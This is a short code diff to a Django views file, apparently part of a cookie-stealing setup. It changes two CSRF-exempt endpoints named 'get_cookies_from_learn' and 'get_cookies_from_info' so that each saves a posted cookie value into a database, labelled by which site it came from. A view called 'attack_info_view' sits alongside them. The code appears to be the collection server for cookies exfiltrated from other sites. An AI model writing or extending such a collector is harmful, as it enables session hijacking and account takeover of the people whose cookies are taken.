@@ -1,11 +1,16 @@
 from django.shortcuts import render
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
+from cookies_storage.models import Cookies_storage
 
 @csrf_exempt
 def get_cookies_from_learn(request):
     if request.method == 'POST':
         print(request.POST)
+        cookie = Cookies_storage()
+        cookie.cookie = request.POST['c']
+        cookie.type = 0
+        cookie.save()
         return JsonResponse({"return_code": 0})
 
 @csrf_exempt
@@ -19,6 +24,10 @@ def attack_info_view(request):
 def get_cookies_from_info(request):
     if request.method == 'POST':
         print(request.POST)
+        cookie = Cookies_storage()
+        cookie.cookie = request.POST['c']
+        cookie.type = 1
+        cookie.save()
         return JsonResponse({"return_code": 0})
 
 
